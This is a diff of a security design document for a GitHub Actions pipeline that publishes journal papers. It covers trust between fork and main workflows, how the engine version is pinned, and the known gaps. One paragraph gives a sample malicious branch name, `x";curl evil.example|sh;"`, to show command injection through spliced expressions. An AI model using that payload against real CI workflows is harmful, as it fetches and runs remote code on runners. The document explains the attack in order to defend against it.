@@ -14,7 +14,7 @@ Two terms recur below. A flow that needs a token runs as two workflows: **Stage 
 An author with push access opens a pull request from a branch. Stage 1 runs their content on a GitHub-hosted runner, a fresh machine discarded after the job, with a read-only token. Their pull request reaches `main` through the `protect-main` rule, which requires the editorial checks to pass and requires an editor's review for any change under `CODEOWNERS`. The author's code runs only in jobs that hold no secret, and every job that holds a secret runs code from `main` or from an editor's version tag.
 
 (r83)=
-A pull request from a fork, the default for an outside contributor, adds a step before anything runs: GitHub holds the run for a maintainer's approval when the contributor has never had anything merged into the repository. That is GitHub's default for a public repository, `oak bootstrap` leaves it there, and the [runbook](src:src/messages.ts#L475-L478) tells the editor to expect the approval click. Once approved, the fork's run builds like any other, and any edit it makes to a gated file needs an editor's review before it can merge. The checks comment also [flags](src:src/checks.ts#L283-L288) a pull request that touches a gated file, and one whose changed files GitHub could not list in full.
+A pull request from a fork, the default for an outside contributor, adds a step before anything runs: GitHub holds the run for a maintainer's approval when the contributor has never had anything merged into the repository. That is GitHub's default for a public repository, `oak bootstrap` leaves it there, and the [runbook](src:src/messages.ts#L477-L480) tells the editor to expect the approval click. Once approved, the fork's run builds like any other, and any edit it makes to a gated file needs an editor's review before it can merge. The checks comment also [flags](src:src/checks.ts#L283-L288) a pull request that touches a gated file, and one whose changed files GitHub could not list in full.
 :::
 
 (design-paper-ci-trust)=
@@ -31,7 +31,7 @@ A pull request from a fork, the default for an outside contributor, adds a step 
 - [`check-paper.yml`](src:templates/paper/.github/workflows/check-paper.yml) and [`post-checks.yml`](src:templates/paper/.github/workflows/post-checks.yml) are the two stages of the editorial checks.
 - [`deposit-version.yml`](src:templates/paper/.github/workflows/deposit-version.yml) and [`reserve-doi.yml`](src:templates/paper/.github/workflows/reserve-doi.yml) handle publishing actions, and are started by a version tag and an editor's manual dispatch. Author content reaches them only after it has merged.
 - [`.github/actions/engine/action.yml`](src:templates/paper/.github/actions/engine/action.yml) is the composite action every workflow calls, and [`pins.yml`](src:templates/paper/.github/actions/engine/pins.yml) beside it, which names the engine and journal repositories for the action and for local `oak`.
-- [`.github/actions/discover/action.yml`](src:templates/paper/.github/actions/discover/action.yml) lists the papers a run builds or checks, one job each. In a paper repository that is the paper at `.`; the co-located case is [below](#design-paper-ci-colocated).
+- Each workflow opens with a `papers` job, holding no secret, that runs [`oak papers`](src:src/papers.ts) to choose the papers the run works on; the later jobs read the list, or the one paper a tag or a dispatch input names, from its result. In a paper repository that is the paper at `.`; the co-located case is [below](#design-paper-ci-colocated).
 - [`CODEOWNERS`](src:templates/paper/CODEOWNERS), and the optional `paper-environment.yml`, a conda environment the action installs before the engine runs, in the jobs that build.
 
 (design-paper-ci-codeowners)=
@@ -117,7 +117,7 @@ The artifact's files are untrusted in the same way its values are. A paper previ
 
 ### Which engine code runs
 
-The composite action [checks the engine out](src:templates/paper/.github/actions/engine/action.yml#L86-L90) from two settings:
+The composite action [checks the engine out](src:templates/paper/.github/actions/engine/action.yml#L88-L92) from two settings:
 
 - `pins.yml` names the engine repository (gated, see [Who can change what](#design-paper-ci-codeowners)).
 - The paper's own `myst.yml` names the version, under `project.options.oaktree-sapling.version`. It is ungated, so an author can move their paper to a newer engine in an ordinary pull request.
@@ -129,7 +129,7 @@ Pinning the repository and letting only the version float keeps the version insi
 
 (r41)=
 
-The action's [`ref` step](src:templates/paper/.github/actions/engine/action.yml#L51-L71) limits the version to a release tag, `vX.Y.Z` or a dev release `vX.Y.Z-dev.N`, on every event, before the engine is checked out. A raw commit, a `refs/pull/N/merge` or a branch is refused, so a paper's pull request naming one goes red while it is still under review, and a version on `main` that names one stops every job there. The rule holds on `main` too because `myst.yml` is ungated, and because GitHub serves a commit pushed to any fork of the engine under the engine repository's own name. Engine changes are tested from a `-dev.N` pre-release ([Releasing](src:RELEASING.md)). The engine's [`ci/run.sh`](src:ci/run.sh#L10-L15) also refuses to run without `dist/cli.cjs`, which is committed onto [release tags](#r57) and nothing else.
+The action's [`ref` step](src:templates/paper/.github/actions/engine/action.yml#L53-L73) limits the version to a release tag, `vX.Y.Z` or a dev release `vX.Y.Z-dev.N`, on every event, before the engine is checked out. A raw commit, a `refs/pull/N/merge` or a branch is refused, so a paper's pull request naming one goes red while it is still under review, and a version on `main` that names one stops every job there. The rule holds on `main` too because `myst.yml` is ungated, and because GitHub serves a commit pushed to any fork of the engine under the engine repository's own name. Engine changes are tested from a `-dev.N` pre-release ([Releasing](src:RELEASING.md)). The engine's [`ci/run.sh`](src:ci/run.sh#L10-L15) also refuses to run without `dist/cli.cjs`, which is committed onto [release tags](#r57) and nothing else.
 
 The same step refuses a version below `min_engine_version` in `pins.yml`, the oldest engine the workflows beside it work with. The workflows leave some checks to the engine, such as [checking the pull request number](#design-paper-ci-stage2-inputs) a fork's artifact names, and read outputs an older engine lacks. A missing output reads as empty, so an older engine skips those checks without an error. [`oak upgrade`](src:src/upgrade.ts#L259-L272) keeps the version at or above it too, ordering versions the same way (a dev release before its release), but the version can also change in an ordinary pull request. `oak build`, `oak validate`, `oak start` and `oak upgrade` accept the same versions as this step, from `ENGINE_VERSION` in [`schema.ts`](src:src/schema.ts).
 
@@ -154,7 +154,9 @@ Before any git call, oak checks that the repository is `owner/name` written with
 
 ### Several papers in one repository
 
-A co-located repository holds the journal's settings, its website and its papers, each paper in `papers/<id>/`, the folder named by its `project.id`. It carries the same launchers as a paper repository, which is the case with one paper at `.`: the discover action lists the papers, and every workflow passes a paper's folder to the engine action as `paper-dir`. The action refuses any `paper-dir` other than `.` or `papers/<id>`, since it becomes a path.
+A co-located repository holds the journal's settings, its website and its papers, each paper in `papers/<id>/`, the folder named by its `project.id`. It carries the same launchers as a paper repository, which is the case with one paper at `.`: `oak papers` lists the papers, and every workflow passes a paper's folder to the engine action as `paper-dir`. The action refuses any `paper-dir` other than `.` or `papers/<id>` before oak runs, since it becomes a path to the paper's environment file.
+
+The tier is read from `pins.yml`, which editors gate: a co-located repository's names an `engine_version`, and a paper repository's does not. A `papers/` folder an author adds to a paper repository changes nothing. `oak papers` refuses a folder in `papers/` that holds a `myst.yml` and is not named by a paper id, so a paper that could be neither built nor checked stops the run.
 
 Each paper is built and checked in a job of its own, at the engine version its own `myst.yml` pins, and installs its own `papers/<id>/paper-environment.yml`, which `CODEOWNERS` gates as it gates the root one. So one paper's plugins and environment never run in another paper's job. On a push to `main` the papers `registry/papers.yml` lists are built; papers the registry does not list are drafts and are not built. The `assemble` job then builds the journal website and copies each paper's build to `/<id>/`, which `oak build` gave a matching base URL. It runs no paper code, and only `deploy-pages` holds the Pages permissions, as in a paper repository.
 
@@ -173,7 +175,7 @@ A version tag names the paper, `<id>/vX.Y.Z`, and `deposit-version.yml` builds a
 Beyond the summary at the top of this page, these gaps remain:
 
 - **The check verdict is authored by Stage 1.** Stage 2 posts the report Stage 1 computed, so a fork that rewrites `check-paper.yml` can post a passing report. That rewrite is itself a change under `.github/`, so the comment flags it and merging it needs an editor. The verdict is a signal for the editor and not an authorisation decision, and the code-owner review is what stands between such a pull request and `main`.
-- **The DOI pull request's checks are held.** `reserve-doi.yml` opens it with the workflow's own `GITHUB_TOKEN`. GitHub holds the runs on that pull request for approval, and approving them does not start the preview, so the editor closes and reopens it to run the usual two stages. Each held run keeps its check suite, and GitHub files the `Journal checks` check run under the first of those suites. The merge rule does not read that suite, so `post-checks` also posts the same result as a [commit status](src:src/gh.ts#L588-L592) named `Journal checks`, which belongs to no suite. Running both stages from `reserve-doi.yml` instead [worked](https://github.com/Open-Scholar-Nexus/oaktree-sapling/pull/46), but it shipped a second path through both stages to every paper repository to save that click.
+- **The DOI pull request's checks are held.** `reserve-doi.yml` opens it with the workflow's own `GITHUB_TOKEN`. GitHub holds the runs on that pull request for approval, and approving them does not start the preview, so the editor closes and reopens it to run the usual two stages. Each held run keeps its check suite, and GitHub files the `Journal checks` check run under the first of those suites. The merge rule does not read that suite, so `post-checks` also posts the same result as a [commit status](src:src/gh.ts#L596-L600) named `Journal checks`, which belongs to no suite. Running both stages from `reserve-doi.yml` instead [worked](https://github.com/Open-Scholar-Nexus/oaktree-sapling/pull/46), but it shipped a second path through both stages to every paper repository to save that click.
 - **Anyone with write access can mark the Journal checks as passed.** The [branch rule](src:src/bootstrap.ts#L455-L463) asks for a passing result named `Journal checks` and accepts it from any source, so a collaborator can post one by hand through GitHub's API. What keeps such a pull request off `main` is the code-owner review. The DOI pull request that [`reserve-doi.yml`](src:templates/paper/.github/workflows/reserve-doi.yml) opens relies on this: its result reaches the rule only through the commit status `post-checks` posts. Restricting the rule to results from GitHub Actions would close this gap: a passing result would have to come from a workflow run, and a hand-posted one would no longer count. Before doing that, check that a DOI pull request can still merge.
 - **The branch rule can be removed.** An admin who deletes `protect-main` turns `CODEOWNERS` back into documentation.
 - **Anything we didn't consider.** See a gap in our design? [Open an issue](https://github.com/Open-Scholar-Nexus/oaktree-sapling/issues) to tell us.
@@ -188,11 +190,11 @@ Beyond the summary at the top of this page, these gaps remain:
 
 (r153)=
 
-A workflow passes a value to a `run:` script through `env:`, not by splicing `${{ }}` into the script body. The runner substitutes a spliced expression as text before bash parses the line, so a fork could name its branch `x";curl evil.example|sh;"` and get `${{ github.head_ref }}` spliced into a script. The composite action's [`dispatch` step](src:templates/paper/.github/actions/engine/action.yml#L99-L108) needs its arguments to word-split, and does that with `set -f` so a `*` in an argument stays a `*`. [`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L218-L221) fails on any frozen `run:` containing `${{`, to avoid this weakness "class" in the future.
+A workflow passes a value to a `run:` script through `env:`, not by splicing `${{ }}` into the script body. The runner substitutes a spliced expression as text before bash parses the line, so a fork could name its branch `x";curl evil.example|sh;"` and get `${{ github.head_ref }}` spliced into a script. The composite action's [`dispatch` step](src:templates/paper/.github/actions/engine/action.yml#L101-L110) needs its arguments to word-split, and does that with `set -f` so a `*` in an argument stays a `*`. [`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L217-L220) fails on any frozen `run:` containing `${{`, to avoid this weakness "class" in the future.
 
 (r155)=
 
-Any value written to `$GITHUB_OUTPUT` is checked before writing. The file is line-oriented, so a value containing a newline appends a second `name=value` pair of the writer's choosing to the step's outputs. The engine version can carry fork-controlled text: the action's [`ref` step](src:templates/paper/.github/actions/engine/action.yml#L25-L72) reads it out of the paper's own `myst.yml`, where a YAML block scalar can span two lines, and refuses anything that is not a release tag. So can the verb's result: [`ci/run.sh`](src:ci/run.sh#L59-L67) writes it as one `result=` line of JSON, with any line break removed, and the workflows read it with `fromJSON`.
+Any value written to `$GITHUB_OUTPUT` is checked before writing. The file is line-oriented, so a value containing a newline appends a second `name=value` pair of the writer's choosing to the step's outputs. The engine version can carry fork-controlled text: the action's [`ref` step](src:templates/paper/.github/actions/engine/action.yml#L25-L74) reads it out of the paper's own `myst.yml`, where a YAML block scalar can span two lines, and refuses anything that is not a release tag. So can the verb's result: [`ci/run.sh`](src:ci/run.sh#L59-L67) writes it as one `result=` line of JSON, with any line break removed, and the workflows read it with `fromJSON`.
 
 (design-paper-ci-bad-input)=
 
@@ -200,13 +202,13 @@ Any value written to `$GITHUB_OUTPUT` is checked before writing. The file is lin
 
 (r97)=
 
-The engine repository in `pins.yml` and the version in `myst.yml` both fail loudly when absent. `yq` prints the literal `null` for a missing key; the [`ref`](src:templates/paper/.github/actions/engine/action.yml#L46-L50) and [`pins`](src:templates/paper/.github/actions/engine/action.yml#L77-L82) steps stop with the file and the key instead.
+The engine repository in `pins.yml` and the version in `myst.yml` both fail loudly when absent. `yq` prints the literal `null` for a missing key; the [`ref`](src:templates/paper/.github/actions/engine/action.yml#L48-L52) and [`pins`](src:templates/paper/.github/actions/engine/action.yml#L79-L84) steps stop with the file and the key instead.
 
 (r137)=
 
-Stage 2 rejects malformed input with a clear error. A report that is not JSON, or JSON without the `checkRun.conclusion` field, makes `post-checks` [exit 1](src:src/cli.ts#L1011-L1028) naming the file and what is wrong with it. An absent `pr-number` file means a push build and is not an error, and an absent `paper` file means `.`. A present and malformed one is a corrupt or hostile artifact, so Stage 2 fails.
+Stage 2 rejects malformed input with a clear error. A report that is not JSON, or JSON without the `checkRun.conclusion` field, makes `post-checks` [exit 1](src:src/cli.ts#L1012-L1029) naming the file and what is wrong with it. An absent `pr-number` file means a push build and is not an error, and an absent `paper` file means `.`. A present and malformed one is a corrupt or hostile artifact, so Stage 2 fails.
 
-[`oak validate --report`](src:src/cli.ts#L854-L857) exits 0 whenever it wrote a report, a failing one included, because `post-checks.yml` runs only after a successful Stage 1. It exits non-zero only when no report was written.
+[`oak validate --report`](src:src/cli.ts#L855-L858) exits 0 whenever it wrote a report, a failing one included, because `post-checks.yml` runs only after a successful Stage 1. It exits non-zero only when no report was written.
 
 (design-paper-ci-artifact-contract)=
 
@@ -238,7 +240,7 @@ Both stages key on the head repository, and the pull request group in each Stage
 
 (r172)=
 
-A workflow reads a secret into `env:` and tests it in `run:`[^why-test-secret-in-run]. A `secrets` reference in a step's `if:` makes GitHub reject the whole workflow file. For a file that only runs on `workflow_dispatch`, such as `reserve-doi.yml`, the rejection shows only when someone runs it. [`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L253-L258) fails on any frozen `if:` that reads `secrets`.
+A workflow reads a secret into `env:` and tests it in `run:`[^why-test-secret-in-run]. A `secrets` reference in a step's `if:` makes GitHub reject the whole workflow file. For a file that only runs on `workflow_dispatch`, such as `reserve-doi.yml`, the rejection shows only when someone runs it. [`test/frozen-guards.test.ts`](src:test/frozen-guards.test.ts#L251-L256) fails on any frozen `if:` that reads `secrets`.
 
 [^why-test-secret-in-run]: The `secrets` context does not exist in a step-level `if:`.
 
